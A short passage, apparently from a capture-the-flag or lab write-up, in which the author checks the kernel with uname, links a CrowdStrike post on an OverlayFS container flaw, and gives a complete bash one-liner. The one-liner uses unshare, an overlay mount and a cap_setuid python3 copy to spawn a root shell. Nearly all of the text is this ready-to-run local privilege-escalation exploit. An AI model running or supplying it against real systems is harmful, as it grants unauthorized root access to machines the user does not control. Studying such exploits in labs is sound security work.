by doing `uname -a` we find its vulnerable to overlayFS

https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
```

and we get root